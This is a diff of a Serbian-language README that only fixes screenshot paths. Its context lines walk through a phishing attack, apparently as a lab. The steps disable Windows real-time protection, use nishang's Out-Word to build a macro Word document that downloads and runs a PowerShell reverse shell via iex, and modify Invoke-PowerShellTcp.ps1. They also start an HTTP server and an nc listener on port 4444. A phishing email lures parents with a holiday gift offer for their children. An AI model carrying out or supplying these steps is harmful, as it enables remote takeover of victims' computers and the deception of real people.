@@ -30,31 +30,31 @@ Maliciozni word dokument kreiran je na operativnom sistemu žrtve (Windows 10). 
 
 &ensp;&ensp;1. Nakon pokretanja operativnog sistema, potrebno je isključiti real-time protection.
 
-![Primer screenshot-a](\Screenshots\real_time_protection.png)
+![Primer screenshot-a](Screenshots/real_time_protection.png)
 
 &ensp;&ensp;2. Zatim, potrebno je preuzeti nishang GitHub repozitorijum: [nishang](https://github.com/samratashok/nishang)
 
 &ensp;&ensp;3. Ekstraktovati repozitorijum na željenu lokaciju, otvoriti direktorijum u powershell-u kao administrator i pozicionirati se u poddirektorijum Client.
 
-![Primer screenshot-a](\Screenshots\positioning.png)
+![Primer screenshot-a](Screenshots/positioning.png)
 
 &ensp;&ensp;4. Uneti komandu koja će da dot source-uje dokument pomoću kojeg se kreira maliciozni word dokument (Out-Word.ps1).
 
 `. .\Out-Word.ps1`
 
-![Primer screenshot-a](\Screenshots\dot_sourced.png)
+![Primer screenshot-a](Screenshots/dot_sourced.png)
 
 &ensp;&ensp;4. Nakon toga, potrebno je uneti komandu koja će kreirati maliciozni word dokument. Potrebno je izmeniti dve IP adrese u komandi na adresu napadača, kao i definisati putanju gde će se sačuvati fajl i dodeliti mu se proizvoljno ime.
 
 `Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadString('http//127.0.0.1/Invoke-PowerShellTcp.ps1');reverse -Reverse -IPAddress 127.0.0.1 -Port 4444" -OutputFile C:\Users\vboxuser\Desktop\malware_word_document.doc`
 
-![Primer screenshot-a](\Screenshots\creating_malicious_file.png)
+![Primer screenshot-a](Screenshots/creating_malicious_file.png)
 
 ## Kreiranje phishing mejla
 
 Nakon kreiranja malicioznog word dokumenta, potrebno je sastaviti phishing mejl, pronaći i prevariti žrtvu. U našem primeru, sastavljen je mejl koji traži od žrtve da preuzme dokument i u njega unese informacije svoje dece da bi deca mogla dobiti navode paketiće. Ideja je takva da bi se mejl slao u prazničnom periodu.
 
-![Primer screenshot-a](\Screenshots\phishing_mail.png)
+![Primer screenshot-a](Screenshots/phishing_mail.png)
 
 ## Kreiranje HTTP Servera za osluškivanje
 
@@ -64,13 +64,13 @@ Server koji osluškuje konekcije od žrtve biće kreiran na operativnog sistemu 
 
 `wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1`
 
-![Primer screenshot-a](\Screenshots\downloading_payload_script.png)
+![Primer screenshot-a](Screenshots/downloading_payload_script.png)
 
 &ensp;&ensp;2. Otvoriti preuzeti fajl i dodati sledeću liniju na kraj. Potrebno je IP adresu zameniti sa IP adresom napadača.
 
 `Invoke-PowerShellTcp -Reverse -IPAddress 10.0.2.4 -Port 4444`
 
-![Primer screenshot-a](\Screenshots\modifying_payload_script.png)
+![Primer screenshot-a](Screenshots/modifying_payload_script.png)
 
 &ensp;&ensp;3. Pokrenuti HTTP server i listener-a u dva zasebna terminala.
 
@@ -78,7 +78,7 @@ Server koji osluškuje konekcije od žrtve biće kreiran na operativnog sistemu 
 
 `nc -lvnp 4444`
 
-![Primer screenshot-a](\Screenshots\starting_server.png)
+![Primer screenshot-a](Screenshots/starting_server.png)
 
 ## Primer uspešnog napada
 
